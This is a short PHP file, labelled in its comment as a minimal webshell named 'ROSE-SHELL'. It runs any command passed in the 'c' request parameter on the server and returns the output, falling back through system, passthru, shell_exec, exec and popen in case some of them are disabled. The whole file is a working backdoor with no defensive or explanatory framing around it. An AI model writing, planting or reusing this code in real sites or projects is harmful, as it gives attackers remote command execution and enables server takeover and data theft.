<?php
// webshell minimal: ?c=cmd (GET/POST), output plain text.
if (isset($_REQUEST['c'])) {
  header('Content-Type: text/plain');
  echo "ROSE-SHELL\n";
  $c = $_REQUEST['c'];
  if (function_exists('system'))        { system($c); }
  elseif (function_exists('passthru'))  { passthru($c); }
  elseif (function_exists('shell_exec')){ echo shell_exec($c); }
  elseif (function_exists('exec'))      { exec($c, $o); echo implode("\n", $o); }
  elseif (function_exists('popen'))     { $h = popen($c, 'r'); while (!feof($h)) echo fread($h, 4096); pclose($h); }
  else { echo 'no exec function'; }
}
